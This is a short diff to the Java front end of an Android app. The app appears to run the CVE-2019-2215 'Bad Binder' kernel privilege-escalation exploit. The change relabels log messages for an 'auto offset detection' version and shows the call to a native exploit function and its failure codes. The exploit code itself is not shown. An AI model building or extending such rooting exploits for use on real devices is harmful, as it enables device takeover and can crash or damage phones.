@@ -163,10 +163,10 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeExploit() {
         appendLog("========================================");
-        appendLog("========== CVE-2019-2215 EXPLOIT ==========");
+        appendLog("========== CVE-2019-2215 AUTO EXPLOIT ==========");
 
-        appendLog("[*] Triggering Bad Binder exploit...");
-        appendLog("[!] WARNING: This may crash the device if offsets are incorrect");
+        appendLog("[*] Triggering Bad Binder exploit with auto offset detection...");
+        appendLog("[!] WARNING: This may crash the device");
 
         int result = nativeExploitCVE20192215();
 
@@ -176,7 +176,7 @@ public class MainActivity extends AppCompatActivity {
         } else if (result == -1) {
             appendLog("[-] Exploit FAILED: Permission denied");
         } else if (result == -2) {
-            appendLog("[-] Exploit FAILED: Device not vulnerable or offsets incorrect");
+            appendLog("[-] Exploit FAILED: Device not vulnerable or offset detection failed");
         } else if (result == -3) {
             appendLog("[-] Exploit FAILED: Kernel panic detected");
         } else {
